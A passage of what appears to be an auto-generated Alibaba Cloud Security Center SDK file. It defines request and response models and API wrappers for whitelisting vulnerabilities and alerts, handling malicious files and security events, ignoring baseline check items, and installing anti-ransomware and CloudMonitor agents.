  var params = new OpenApi.Params{
    action = 'GetVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about a vulnerability whitelist.
 *
 * @param request GetVulWhitelistRequest
 * @return GetVulWhitelistResponse
 */
async function getVulWhitelist(request: GetVulWhitelistRequest): GetVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return getVulWhitelistWithOptions(request, runtime);
}

model GrantSwitchAgreementRequest {
  isAgree?: boolean(name='IsAgree', description='Indicates whether to agree to migrate the client connections from overseas servers to the Singapore center.', example='true'),
  lang?: string(name='Lang', description='The language type for requests and responses. The default value is **zh**. Possible values:

- **zh**: Chinese
- **en**: English', example='zh'),
  type?: string(name='Type', description='Switching type. Possible values:

- **sg_switch**: Migrate client connections from overseas servers to Singapore', example='sg_switch'),
}

model GrantSwitchAgreementResponseBody = {
  code?: string(name='Code', description='Code number.', example='200'),
  message?: string(name='Message', description='The message returned with the request result.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for the request, and can be used for troubleshooting and problem localization.', example='11C96623-E106-59C9-866D-A6C82911459F'),
}

model GrantSwitchAgreementResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GrantSwitchAgreementResponseBody(name='body'),
}

/**
 * @summary Authorization for Switching Migration
 *
 * @param request GrantSwitchAgreementRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GrantSwitchAgreementResponse
 */
async function grantSwitchAgreementWithOptions(request: GrantSwitchAgreementRequest, runtime: Util.RuntimeOptions): GrantSwitchAgreementResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.isAgree)) {
    query['IsAgree'] = request.isAgree;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GrantSwitchAgreement',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Authorization for Switching Migration
 *
 * @param request GrantSwitchAgreementRequest
 * @return GrantSwitchAgreementResponse
 */
async function grantSwitchAgreement(request: GrantSwitchAgreementRequest): GrantSwitchAgreementResponse {
  var runtime = new Util.RuntimeOptions{};
  return grantSwitchAgreementWithOptions(request, runtime);
}

model HandleMaliciousFilesRequest {
  fileIdList?: [ long ](name='FileIdList', description='List of file IDs to be processed.
> You can call [ListAgentlessMaliciousFiles](~~ListAgentlessMaliciousFiles~~) to get the IDs.
> -'),
  operation?: string(name='Operation', description='Type of operation:
- addWhitelist: Add to whitelist
- offWhitelist: Remove from whitelist', example='addWhitelist'),
}

model HandleMaliciousFilesResponseBody = {
  code?: string(name='Code', description='Result code, **200** indicates success, any other value indicates failure. The caller can use this field to determine the reason for the failure.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='Return message of the request.', example='successful'),
  requestId?: string(name='RequestId', description='The unique identifier generated by Alibaba Cloud for this request.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8B****'),
  success?: boolean(name='Success', description='Indicates whether the API call was successful. Values:
- **true**: Success
- **false**: Failure', example='true'),
}

model HandleMaliciousFilesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: HandleMaliciousFilesResponseBody(name='body'),
}

/**
 * @summary Handle Malicious Files
 *
 * @param request HandleMaliciousFilesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return HandleMaliciousFilesResponse
 */
async function handleMaliciousFilesWithOptions(request: HandleMaliciousFilesRequest, runtime: Util.RuntimeOptions): HandleMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.fileIdList)) {
    query['FileIdList'] = request.fileIdList;
  }
  if (!Util.isUnset(request.operation)) {
    query['Operation'] = request.operation;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handle Malicious Files
 *
 * @param request HandleMaliciousFilesRequest
 * @return HandleMaliciousFilesResponse
 */
async function handleMaliciousFiles(request: HandleMaliciousFilesRequest): HandleMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleMaliciousFilesWithOptions(request, runtime);
}

model HandleSecurityEventsRequest {
  markBatch?: string(name='MarkBatch', description='Specifies whether to add multiple alert events to the whitelist at a time. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  markMissParam?: string(name='MarkMissParam', description='The whitelist rule. The value of this parameter is in the JSON format and contains the following fields:

*   **field**: The field based on which alert events are added to the whitelist.

*   **operate**: The method that is used to added alert events to the whitelist. Valid values:

    *   **notContains**: does not contain
    *   **contains**: contains
    *   **regex**: matches by regular expression
    *   **strEqual**: equals
    *   **strNotEqual**: does not equal

*   **fieldValue**: The value of the field based on which alert events are added to the whitelist.

*   **uuid**: The application scope of the whitelist rule. Valid values:

    *   **part**: the current asset
    *   **ALL**: all assets

>  You can call the [DescribeSecurityEventOperations](~~DescribeSecurityEventOperations~~) operation to obtain the fields that you can specify for **field**.', example='[{"uuid":"part","field":"gmtModified","operate":"contains","fieldValue":"asd"},{"uuid":"part","field":"loginUser","operate":"contains","fieldValue":"vff"}]'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform to handle the alert events. Valid values:

*   **block_ip**: blocks the source IP address.
*   **advance_mark_mis_info**: adds the alert events to the whitelist.
*   **ignore**: ignores the alert events.
*   **manual_handled**: marks the alert events as manually handled.
*   **kill_process**: terminates the malicious process.
*   **cleanup**: performs in-depth virus detection and removal.
*   **kill_and_quara**: kills the malicious processes and quarantines the source file.
*   **disable_malicious_defense**: stops the container on which the alerting files or processes exist.
*   **client_problem_check**: performs troubleshooting.
*   **quara**: quarantines the source file of the malicious process.

This parameter is required.', example='block_ip'),
  operationParams?: string(name='OperationParams', description='The configuration of the operation that you want to perform to handle the alert events.

>  If you set OperationCode to `kill_and_quara` or `block_ip`, you must specify OperationParams. If you set OperationCode to other values, you can leave OperationParams empty.', example='{}'),
  remark?: string(name='Remark', description='The remarks of the handling operation.', example='remark test.'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to obtain the IDs.', example='16670360956*****'),
  securityEventIds?: [ string ](name='SecurityEventIds', description='The IDs of the alert events.

This parameter is required.', example='["909361"]'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model HandleSecurityEventsResponseBody = {
  handleSecurityEventsResponse?: {
    taskId?: long(name='TaskId', description='The ID of the task to handle the alert events.', example='15411'),
  }(name='HandleSecurityEventsResponse', description='The handling result of the alert events.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='FF0020B9-999F-5DE2-985F-DB282BDA5311'),
}

model HandleSecurityEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: HandleSecurityEventsResponseBody(name='body'),
}

/**
 * @summary Handles alert events.
 *
 * @param request HandleSecurityEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return HandleSecurityEventsResponse
 */
async function handleSecurityEventsWithOptions(request: HandleSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markBatch)) {
    query['MarkBatch'] = request.markBatch;
  }
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  if (!Util.isUnset(request.securityEventIds)) {
    query['SecurityEventIds'] = request.securityEventIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles alert events.
 *
 * @param request HandleSecurityEventsRequest
 * @return HandleSecurityEventsResponse
 */
async function handleSecurityEvents(request: HandleSecurityEventsRequest): HandleSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSecurityEventsWithOptions(request, runtime);
}

model HandleSimilarSecurityEventsRequest {
  markMissParam?: string(name='MarkMissParam', description='The whitelist rule. For example, if you want to add a file that contains the string a to the whitelist based on the MD5 hash value, set this parameter to {"field":"md5","operate":"contains","fieldValue":"aa"}.', example='{"field":"md5","operate":"contains","fieldValue":"aa"}'),
  operationCode?: string(name='OperationCode', description='The operation that you want to perform to handle the alert events.

>  You can call the [DescribeSecurityEventOperations](~~DescribeSecurityEventOperations~~) operation to query the operations.

This parameter is required.', example='offline_handled'),
  operationParams?: string(name='OperationParams', description='The configuration of the operation that you want to perform to handle the alert events. The value of this parameter is in the JSON format.

>  If you set **OperationCode** to **kill_and_quara**, **block_ip**, or **virus_quara**, you must specify OperationParams. If you set **OperationCode** to other values, you can leave OperationParams empty. If you set **OperationCode** to **block_ip**, the value of OperationParams must consist of the following fields:

> *   **expireTime**: the end time of locking. Unit: milliseconds.

>  If you set **OperationCode** to **kill_and_quara**, the value of OperationParams must consist of the following fields:

> *   **subOperation**: the method of detection and removal. Valid values:

>     *   **killAndQuaraFileByMd5andPath**: terminates the process and quarantines the source file of the process.
>     *   **killByMd5andPath**: terminates the running process.

>  If you set **OperationCode** to **virus_quara**, the value of OperationParams consists of the following fields:

> *   **subOperation**: the method of detection and removal. Valid values:

>     *   **quaraFileByMd5andPath**: quarantines the source file of the process.', example='{"expireTime":1646208726195}'),
  remark?: string(name='Remark', description='The remark of the operation.', example='remark test.'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  taskId?: long(name='TaskId', description='The ID of the task that handles the alert events at a time.

>  You can call the [CreateSimilarSecurityEventsQueryTask](~~CreateSimilarSecurityEventsQueryTask~~) operation to query the IDs of tasks.

This parameter is required.', example='666038'),
}

model HandleSimilarSecurityEventsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3653911-33A6-5268-8B91-7690471F7AA1'),
}

model HandleSimilarSecurityEventsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: HandleSimilarSecurityEventsResponseBody(name='body'),
}

/**
 * @summary Handles multiple alert events that are triggered by the same IP address rule or IP address rules of the same type at a time.
 *
 * @param request HandleSimilarSecurityEventsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return HandleSimilarSecurityEventsResponse
 */
async function handleSimilarSecurityEventsWithOptions(request: HandleSimilarSecurityEventsRequest, runtime: Util.RuntimeOptions): HandleSimilarSecurityEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.markMissParam)) {
    query['MarkMissParam'] = request.markMissParam;
  }
  if (!Util.isUnset(request.operationCode)) {
    query['OperationCode'] = request.operationCode;
  }
  if (!Util.isUnset(request.operationParams)) {
    query['OperationParams'] = request.operationParams;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'HandleSimilarSecurityEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Handles multiple alert events that are triggered by the same IP address rule or IP address rules of the same type at a time.
 *
 * @param request HandleSimilarSecurityEventsRequest
 * @return HandleSimilarSecurityEventsResponse
 */
async function handleSimilarSecurityEvents(request: HandleSimilarSecurityEventsRequest): HandleSimilarSecurityEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return handleSimilarSecurityEventsWithOptions(request, runtime);
}

model IgnoreCheckItemsRequest {
  checkAndRiskTypeList?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='52'),
      riskType?: string(name='RiskType', description='The baseline type of the check item.', example='weak_password'),
    }
  ](name='CheckAndRiskTypeList', description='The information about check items.'),
  checkIds?: [ long ](name='CheckIds', description='The IDs of check items.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  reason?: string(name='Reason', description='The reason why you add the risk item to the whitelist.', example='already config in another way'),
  source?: string(name='Source', description='The data source. Valid values:

*   **default**: host baseline
*   **agentless**: agentless baseline', example='agentless'),
  type?: int32(name='Type', description='The operation that you want to perform on the risk item.Valid values:
*  **1**: adds the risk item to the whitelist
*  **2**: removes the risk item from the whitelist

This parameter is required.', example='1'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.'),
}

model IgnoreCheckItemsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='11EBEC99-B4B5-542E-8C17-B87B624C****'),
}

model IgnoreCheckItemsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: IgnoreCheckItemsResponseBody(name='body'),
}

/**
 * @summary Adds risk items to the whitelist or removes risk items from the whitelist by specifying servers and risk items.
 *
 * @param request IgnoreCheckItemsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return IgnoreCheckItemsResponse
 */
async function ignoreCheckItemsWithOptions(request: IgnoreCheckItemsRequest, runtime: Util.RuntimeOptions): IgnoreCheckItemsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkAndRiskTypeList)) {
    query['CheckAndRiskTypeList'] = request.checkAndRiskTypeList;
  }
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreCheckItems',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds risk items to the whitelist or removes risk items from the whitelist by specifying servers and risk items.
 *
 * @param request IgnoreCheckItemsRequest
 * @return IgnoreCheckItemsResponse
 */
async function ignoreCheckItems(request: IgnoreCheckItemsRequest): IgnoreCheckItemsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreCheckItemsWithOptions(request, runtime);
}

model IgnoreHcCheckWarningsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the check item.

>  You can call the [DescribeCheckWarnings](https://help.aliyun.com/document_detail/116182.html) operation to query the IDs of check items.', example='21313'),
  checkWarningIds?: string(name='CheckWarningIds', description='The ID of the alert that is triggered by the check item. Separate multiple IDs with commas (,).

>  You can call the [DescribeCheckWarnings](https://help.aliyun.com/document_detail/116182.html) operation to query the IDs of alerts that are triggered by check items.', example='98146905,98146907'),
  reason?: string(name='Reason', description='The reason for the current operation.', example='ignore'),
  riskId?: string(name='RiskId', description='The ID of the risk item that you want to ignore or cancel ignoring.

>  You can call the [DescribeCheckWarningSummary](https://help.aliyun.com/document_detail/116179.html) operation to query the IDs of risk items.', example='51'),
  source?: string(name='Source', description='The data source. If this parameter is left empty, the server baseline results are queried by default. Valid values:
* **default**: server
* **agentless**', example='agentless'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  type?: long(name='Type', description='The type of the operation that you want to perform. Valid values:

*   **1**: ignores a risk item
*   **2**: cancels ignoring a risk item

This parameter is required.', example='1'),
}

model IgnoreHcCheckWarningsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B113119F'),
}

model IgnoreHcCheckWarningsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: IgnoreHcCheckWarningsResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI IgnoreHcCheckWarnings is deprecated, please use Sas::2018-12-03::IgnoreCheckItems instead.
 *
 * @summary Ignores multiple baseline risk items at a time or cancels the ignore action that is performed on multiple baseline risk items at a time.
 *
 * @param request IgnoreHcCheckWarningsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return IgnoreHcCheckWarningsResponse
 */
// Deprecated
async function ignoreHcCheckWarningsWithOptions(request: IgnoreHcCheckWarningsRequest, runtime: Util.RuntimeOptions): IgnoreHcCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.checkWarningIds)) {
    query['CheckWarningIds'] = request.checkWarningIds;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreHcCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @deprecated OpenAPI IgnoreHcCheckWarnings is deprecated, please use Sas::2018-12-03::IgnoreCheckItems instead.
 *
 * @summary Ignores multiple baseline risk items at a time or cancels the ignore action that is performed on multiple baseline risk items at a time.
 *
 * @param request IgnoreHcCheckWarningsRequest
 * @return IgnoreHcCheckWarningsResponse
 */
// Deprecated
async function ignoreHcCheckWarnings(request: IgnoreHcCheckWarningsRequest): IgnoreHcCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreHcCheckWarningsWithOptions(request, runtime);
}

model IgnoreIdcProbeScanResultRequest {
  ignoreAction?: int32(name='IgnoreAction', description='The operation that you want to perform. Valid values:

*   **1**: adds the scan result to the whitelist.
*   **2**: ignores the scan result.

This parameter is required.', example='1'),
  scanResultIds?: string(name='ScanResultIds', description='The ID of the scan result. Separate multiple IDs with commas (,).

>  You can call the [DescribeIdcProbeScanResultList](~~DescribeIdcProbeScanResultList~~) operation to query the ID.

This parameter is required.', example='332098932,332098964,332098963'),
}

model IgnoreIdcProbeScanResultResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='E30282D8-AB2D-5EB1-998B-2DDFA948D49D'),
}

model IgnoreIdcProbeScanResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: IgnoreIdcProbeScanResultResponseBody(name='body'),
}

/**
 * @summary Adds the result scanned by an IDC probe to the whitelist or ignores the scan result.
 *
 * @param request IgnoreIdcProbeScanResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return IgnoreIdcProbeScanResultResponse
 */
async function ignoreIdcProbeScanResultWithOptions(request: IgnoreIdcProbeScanResultRequest, runtime: Util.RuntimeOptions): IgnoreIdcProbeScanResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ignoreAction)) {
    query['IgnoreAction'] = request.ignoreAction;
  }
  if (!Util.isUnset(request.scanResultIds)) {
    query['ScanResultIds'] = request.scanResultIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'IgnoreIdcProbeScanResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Adds the result scanned by an IDC probe to the whitelist or ignores the scan result.
 *
 * @param request IgnoreIdcProbeScanResultRequest
 * @return IgnoreIdcProbeScanResultResponse
 */
async function ignoreIdcProbeScanResult(request: IgnoreIdcProbeScanResultRequest): IgnoreIdcProbeScanResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return ignoreIdcProbeScanResultWithOptions(request, runtime);
}

model InstallBackupClientRequest {
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**

This parameter is required.', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server on which you want to install the anti-ransomware agent.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers. You must specify at least one of the UuidList and Uuid parameters.', example='inet-617eddab-7df4-4a51-b217-a3f59194****'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of servers on which you want to install the anti-ransomware agent.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]'),
}

model InstallBackupClientResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model InstallBackupClientResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: InstallBackupClientResponseBody(name='body'),
}

/**
 * @summary Installs the anti-ransomware agent.
 *
 * @param request InstallBackupClientRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return InstallBackupClientResponse
 */
async function installBackupClientWithOptions(request: InstallBackupClientRequest, runtime: Util.RuntimeOptions): InstallBackupClientResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallBackupClient',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the anti-ransomware agent.
 *
 * @param request InstallBackupClientRequest
 * @return InstallBackupClientResponse
 */
async function installBackupClient(request: InstallBackupClientRequest): InstallBackupClientResponse {
  var runtime = new Util.RuntimeOptions{};
  return installBackupClientWithOptions(request, runtime);
}

model InstallCloudMonitorRequest {
  agentAccessKey?: string(name='AgentAccessKey', description='The AccessKey ID that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](https://help.aliyun.com/document_detail/114948.html) operation to query the AccessKey ID.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='usY*****R_U'),
  agentSecretKey?: string(name='AgentSecretKey', description='The AccessKey secret that is required to install the CloudMonitor agent. You can call the [DescribeMonitoringAgentAccessKey](https://help.aliyun.com/document_detail/114948.html) operation to query the AccessKey secret.

> This parameter is required only when you install the CloudMonitor agent on servers that are not deployed on Alibaba Cloud.', example='UCxF2R1sIO90XlU9****'),
  argusVersion?: string(name='ArgusVersion', description='The version of the CloudMonitor agent that you want to install on the servers. For more information about the latest version of the CloudMonitor agent, see [Overview](https://help.aliyun.com/document_detail/183431.html).

This parameter is required.', example='3.5.6'),
  instanceIdList?: [ string ](name='InstanceIdList', description='The IDs of the servers on which you want to install the CloudMonitor agent. Separate multiple IDs with commas (,).'),
  uuidList?: [ string ](name='UuidList', description='The UUIDs of the servers on which you want to install the CloudMonitor agent. Separate multiple UUIDs with commas (,).'),
}

model InstallCloudMonitorResponseBody = {
  code?: string(name='Code', description='The error code returned if the request fails.', example='IllegalParam'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='400'),
  message?: string(name='Message', description='The error message returned.', example='There was an error with your request.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F92AFB96-FACC-57E7-928E-678D04B94CAE'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='false'),
}

model InstallCloudMonitorResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: InstallCloudMonitorResponseBody(name='body'),
}

/**
 * @summary Installs the CloudMonitor agent on specified servers.
 *
 * @description > Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
 *
 * @param request InstallCloudMonitorRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return InstallCloudMonitorResponse
 */
async function installCloudMonitorWithOptions(request: InstallCloudMonitorRequest, runtime: Util.RuntimeOptions): InstallCloudMonitorResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.agentAccessKey)) {
    query['AgentAccessKey'] = request.agentAccessKey;
  }
  if (!Util.isUnset(request.agentSecretKey)) {
    query['AgentSecretKey'] = request.agentSecretKey;
  }
  if (!Util.isUnset(request.argusVersion)) {
    query['ArgusVersion'] = request.argusVersion;
  }
  if (!Util.isUnset(request.instanceIdList)) {
    query['InstanceIdList'] = request.instanceIdList;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallCloudMonitor',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Installs the CloudMonitor agent on specified servers.
 *
 * @description > Before you call this operation, make sure that the Security Center agent on your servers is online and the servers can access Alibaba Cloud services.
 *
 * @param request InstallCloudMonitorRequest
 * @return InstallCloudMonitorResponse
 */
async function installCloudMonitor(request: InstallCloudMonitorRequest): InstallCloudMonitorResponse {
  var runtime = new Util.RuntimeOptions{};
  return installCloudMonitorWithOptions(request, runtime);
}

model InstallHybridProxyRequest {
